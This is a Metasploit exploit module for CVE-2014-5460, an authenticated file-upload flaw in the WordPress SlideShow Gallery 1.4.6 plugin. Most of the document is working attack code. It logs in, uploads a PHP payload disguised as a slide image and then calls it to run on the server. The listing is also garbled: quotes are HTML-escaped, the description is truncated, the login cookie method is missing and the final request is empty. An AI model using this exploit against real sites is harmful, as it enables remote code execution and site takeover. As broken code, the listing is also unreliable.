# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(
      info,
      &#039;Description&#039;    => %q{
          vulnerability. We can upload arbitrary files to the upload folder, because
          api it&#039;s possible to upload any file type.
      },
      &#039;Author&#039;         =>
        [
          &#039;Jesus Ramirez Pichardo&#039;, # Vulnerability discovery
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2014-5460&#039;],
          [&#039;EDB&#039;, &#039;34681&#039;],
          [&#039;WPVDB&#039;, &#039;7532&#039;]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [[&#039;WP SlideShow Gallery 1.4.6&#039;, {}]],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Aug 28 2014&#039;))

    register_options(
      [
        OptString.new(&#039;WP_USER&#039;, [true, &#039;A valid username&#039;, nil]),
        OptString.new(&#039;WP_PASSWORD&#039;, [true, &#039;Valid password for the provided username&#039;, nil])
      ], self.class)
  end

  def user
    datastore[&#039;WP_USER&#039;]
  end

  def password
    datastore[&#039;WP_PASSWORD&#039;]
  end

  def check
    check_plugin_version_from_readme(&#039;slideshow-gallery&#039;, &#039;1.4.7&#039;)
  end

  def exploit
    print_status("#{peer} - Trying to login as #{user}")
    if cookie.nil?
      print_error("#{peer} - Unable to login as #{user}")
      return
    end

    print_status("#{peer} - Trying to upload payload")
    filename = "#{rand_text_alpha_lower(8)}.php"

    data = Rex::MIME::Message.new
    data.add_part("", nil, nil, &#039;form-data; name="Slide[id]"&#039;)
    data.add_part("", nil, nil, &#039;form-data; name="Slide[link]"&#039;)
    data.add_part("", nil, nil, &#039;form-data; name="Slide[image_url]"&#039;)
    data.add_part(&#039;both&#039;, nil, nil, &#039;form-data; name="Slide[showinfo]"&#039;)
    data.add_part(&#039;randonx&#039;, nil, nil, &#039;form-data; name="Slide[description]"&#039;)
    data.add_part(&#039;file&#039;, nil, nil, &#039;form-data; name="Slide[type]"&#039;)
    data.add_part(&#039;randonx&#039;, nil, nil, &#039;form-data; name="Slide[title]"&#039;)
    data.add_part(&#039;70&#039;, nil, nil, &#039;form-data; name="Slide[iopacity]"&#039;)
    data.add_part(&#039;N&#039;, nil, nil, &#039;form-data; name="Slide[uselink]"&#039;)
    data.add_part("", nil, nil, &#039;form-data; name="Slide[order]"&#039;)
    data.add_part(&#039;self&#039;, nil, nil, &#039;form-data; name="Slide[linktarget]"&#039;)
    data.add_part(payload.encoded, &#039;application/x-httpd-php&#039;, nil, "form-data; name=\"image_file\"; filename=\"#{filename}\"")
    post_data = data.to_s

    print_status("#{peer} - Uploading payload")
    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;ctype&#039;    => "multipart/form-data; boundary=#{data.bound}",
      &#039;vars_get&#039; => {
        &#039;page&#039; => &#039;slideshow-slides&#039;,
        &#039;method&#039; => &#039;save&#039;
      },
      &#039;data&#039;     => post_data,
      &#039;cookie&#039;   => cookie
    })

    if res
      if res.code == 200
        register_files_for_cleanup(filename)
      else
        fail_with(Failure::Unknown, "#{peer} - You do not have sufficient permissions to access this page.")
      end
    else
      fail_with(Failure::Unknown, &#039;Server did not respond in an expected way&#039;)
    end

    print_status("#{peer} - Calling uploaded file #{filename}")
    send_request_cgi(
    )
  end
end

